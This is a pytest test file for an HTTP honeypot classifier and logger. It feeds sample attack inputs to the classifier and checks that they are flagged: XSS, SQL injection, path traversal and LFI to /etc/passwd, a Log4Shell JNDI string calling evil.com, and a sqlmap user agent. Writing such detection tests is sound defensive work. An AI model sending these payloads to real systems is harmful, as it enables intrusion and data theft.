"""Tests for project 64 HTTP honeypot core."""

from __future__ import annotations

import time

import pytest

from project_64.core import (
    HONEYPOT_PATHS,
    HTTPHoneypotLogger,
    HTTPRequest,
    ThreatClassification,
    classify_request,
)


def _req(
    path: str = "/",
    method: str = "GET",
    query: str = "",
    body: str = "",
    ua: str = "Mozilla/5.0",
    src_ip: str = "10.0.0.1",
) -> HTTPRequest:
    return HTTPRequest(
        timestamp=time.time(), src_ip=src_ip, src_port=12345,
        method=method, path=path, query_string=query,
        http_version="HTTP/1.1",
        headers={"User-Agent": ua},
        body=body, session_id="test-session",
    )


class TestClassifyRequest:
    def test_benign_request(self) -> None:
        tc = classify_request(_req("/index.html"))
        assert not tc.is_threat

    def test_honeypot_path_hit(self) -> None:
        tc = classify_request(_req("/wp-admin"))
        assert tc.is_honeypot_hit
        assert tc.is_threat

    def test_env_file_hit(self) -> None:
        tc = classify_request(_req("/.env"))
        assert tc.is_honeypot_hit

    def test_xss_in_query(self) -> None:
        tc = classify_request(_req("/search", query="q=<script>alert(1)</script>"))
        assert "xss_attempt" in tc.threat_types

    def test_sqli_in_body(self) -> None:
        tc = classify_request(_req("/login", method="POST", body="user=admin' UNION SELECT *--"))
        assert "sql_injection" in tc.threat_types

    def test_path_traversal(self) -> None:
        tc = classify_request(_req("/files/../../etc/passwd"))
        assert "path_traversal" in tc.threat_types

    def test_log4shell(self) -> None:
        tc = classify_request(_req("/", ua="${jndi:ldap://evil.com/a}"))
        assert "log4shell" in tc.threat_types
        assert tc.severity == "high"

    def test_lfi_etc_passwd(self) -> None:
        tc = classify_request(_req("/", query="file=/etc/passwd"))
        assert "lfi_etc_passwd" in tc.threat_types
        assert tc.severity == "high"

    def test_scanner_ua(self) -> None:
        tc = classify_request(_req("/", ua="sqlmap/1.7"))
        assert "scanner_ua" in tc.threat_types


class TestHTTPHoneypotLogger:
    def test_record_and_retrieve(self) -> None:
        hp_logger = HTTPHoneypotLogger()
        tc = classify_request(_req("/wp-admin"))
        hp_logger.record(tc)
        events = hp_logger.all_events()
        assert len(events) == 1

    def test_threat_summary(self) -> None:
        hp_logger = HTTPHoneypotLogger()
        hp_logger.record(classify_request(_req("/wp-admin")))
        hp_logger.record(classify_request(_req("/index.html")))
        hp_logger.record(classify_request(_req("/.env")))
        summary = hp_logger.threat_summary()
        assert summary["total_requests"] == 3
        assert summary["threat_requests"] >= 2

    def test_writes_to_file(self, tmp_path) -> None:
        import json
        log_file = tmp_path / "hp.jsonl"
        hp_logger = HTTPHoneypotLogger(log_path=log_file)
        hp_logger.record(classify_request(_req("/.env")))
        lines = log_file.read_text().splitlines()
        assert len(lines) == 1
        data = json.loads(lines[0])
        assert data["honeypot_hit"] is True
